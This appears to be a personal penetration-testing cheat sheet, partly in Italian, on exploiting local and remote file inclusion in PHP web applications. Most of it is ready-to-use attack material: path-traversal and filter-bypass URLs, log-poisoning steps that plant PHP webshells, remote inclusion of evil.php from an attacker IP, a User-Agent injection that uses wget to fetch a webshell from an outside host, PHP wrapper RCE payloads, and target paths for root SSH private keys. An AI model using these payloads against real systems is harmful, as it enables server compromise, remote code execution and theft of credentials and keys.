# LFI
#### Linux:  
```http
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
#### Windows
```http
http://target.com/?page=c:\windows\system32\drivers\etc\hosts
http://webserver:ip/index.html?../../../../../boot.ini
```

***
## Log Poisoning  

Good Candidates:
  ```
  /var/log/apache/access.log
  /var/log/apache/error.log
  /var/log/vsftpd.log
  /var/log/sshd.log
  /var/log/mail
```

#### Web log poisoning
```bash
nc 10.10.10.14 80
<?php echo '<pre>' . shell_exec($_GET['cmd'])  . '</pre>'; ?>
```
**Linux**
```bash
curl http://10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit
```

**Windows**
```bash
curl http://10.10.10.14/menu.php?file=c:\xamp\apache\logs\access.log&cmd=ls
```

<br><br>
#### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  
<br><br>

#### Mail log  
Metodo LFI /var/mail/*user*


```bash
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  

<?php echo system($_REQUEST[cmd]); ?>  

<end with .>  

```

***
# RFI  

It requires allow_url_fopen=On and allow_url_include=On.
An example of vulnerable code:

```php

$incfile = $_REQUEST["file"];  
include($incfile.".php");  

```

```http
#Original
http://10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=FR&Submit=Submit

#Modified
http://10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://10.10.10.10./evil.php&Submit=Submit

#Se ci sono problemi con i '.php' possiamo usare un'altra estensione o un nullbyte (se permesso dalla versione < PHP_5.3) 
http:10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://10.10.10.10./evil.php%00&Submit=Submit
```

<br>
 
Se non riesco ad ottenere una revshell posso comunque eseguire codice via php caricato in remoto. A quel punto posso scaricare con curl/wget una revshell o se non ho permessi per scrivere almeno leggere i file sensibili

```php
<?php

        echo "<pre>";
        system('whoami && uname -a && ss -antlp && ls -la /var/www/html/ && cat /var/www/html/db.php');
        echo "</pre>";
        die;

?>

```

Vedere anche [[Post Exploitaton/File Download]]
***
# Common Issues

Just the path  
```
filename=/etc/passwd
```
Stripped non recursive  
```
filename=....//....//....//etc/passwd
```
Encoding  
```
filename=..%252f..%252f..%252fetc/passwd
```
Validation of start path
```
filename=/var/www/images/../../../etc/passwd
```
Adding a Nullbyte
```
filename=..%252f..%252f..%252fetc/passwd%00
```

Per altre tecniche di bypass vedere [[File Upload]]

***
# Common LFI to RCE
Attenzione ai #Wrappers e a molte funzionalita' di PHP. Non dare **mai** per scontato che qualcosa sia gia' abilitato. Se possibile vedere un file php info prima di exploitare:

```php
<?php phpinfo(): ?>
```
<br>

## 1) Using file upload forms/functions
Quite easy, upload a shell then:
```http
http://example.com/index.php?page=path/to/uploaded/file.php
```
<br>

## 2) Using the PHP wrapper expect://command
if the app uses an include:
```php
<?php  
include $_GET['page'];  
?>  
```
It's possible to use wrappers:
```http
http://target.com/index.php?page=expect://whoami  
```
<br>

## 3) Using php wrapper file:// (RFI)
```http
http://localhost/include.php?page=file:///path/to/file.ext
```
<br>

## 4) Using the PHP wrapper php://filter (LFI)
```http
http://localhost/include.php?page=php://filter/convert.base64-encode/resource=secret.inc

http://localhost/include.php?page=php://filter/read=convert.base64-encode/resource=secret.inc

http://localhost/include.php?page=php://filter/resource=/etc/passwd
```
<br>

## 5) Using PHP input:// stream
POST based RCE
```http
/fi/?page=php://input&cmd=ls
```
<br>

## 6) Using data://text/plain;base64,command (RCE)
```php
data://text/plain;base64,[command encoded in base64]
or
data://text/plain,<?php shell_exec($_GET['cmd']);?>  
```
Esempio:
```http
#Original Req
http://example.com/Keeper.php?page=data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=

#Decoded
http://example.com/Keeper.php?page=data://text/plain,<?system('id');?>  
```
<br>

## 7) Using /proc/self/environ
Another popular technique is to manipulate the Process Environ file. In a nutshell, when a process is created and has an open file handler then a file descriptor will point to that requested file.

Our main target is to inject the /proc/self/environ file from the HTTP Header: User-Agent. This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there.
```bash
curl http://secureapplication.example/index.php?view=../../../proc/self/environ
```
Server Response:
```
...snip...
HTTP_USER_AGENT="curl/" </body>
...snip...
```
so we can inject stuff like a webshell
```bash
curl -H "User-Agent: <?php system('wget http://10.10.14.6/webshell.php -O webshell.php')" http://target.com

curl http://target.com/webshell.php&cmd=ls

```

Altre tecniche con /proc [[LFI w/ proc]]
<br>


## 8) Using /proc/self/fd
brute force the fd (File Descriptor) until you see "referer"
*/proc/self/fd/{number}*

```
curl -H "Referer: <?php phpinfo(); ?>" http://target.com
```

*(Da Stackoverflow):*
`/proc/self/fd` reports the files opened by a process. Each entry is a “magic” symbolic link whose name is the [file descriptor](https://en.wikipedia.org/wiki/File_descriptor) and whose target is the open file. It's magic in the sense that the link actually points to the file itself, even if the file name obtained by calling `readlink` is not a valid file name, which happens, for example, with files that don't have a name (such as anonymous pipes and sockets), and with deleted files.

Altre tecniche con /proc [[LFI w/ proc]]
<br>


## 9) Using zip
Upload a ZIP file containing a PHP shell compressed and access:
```http
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
<br>



# 5 Common files location
## Common FIle Location


https://wiki.apache.org/httpd/DistrosDefaultLayout  
**Common log file location**  
**Ubuntu, Debian**  
```
/var/log/apache2/error.log  
/var/log/apache2/access.log  
```
**Red Hat, CentOS, Fedora, OEL, RHEL**  
```
/var/log/httpd/error_log  
/var/log/httpd/access_log  
```
**FreeBSD**  
```
/var/log/httpd-error.log  
/var/log/httpd-access.log  
```
**Common Config file location**  

check any restriction or hidden path on accessing the server  

**Ubuntu**  
```
/etc/apache2/apache2.conf  
/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  
```
**FreeBSD**  
```
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  
```

**root/user ssh keys? .bash_history?**
```
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/root/.ssh/known_hosts
```

***

# Resources
https://www.php.net/manual/en/wrappers.file.php
https://book.hacktricks.xyz/pentesting-web/file-upload
https://book.hacktricks.xyz/pentesting-web/file-inclusion
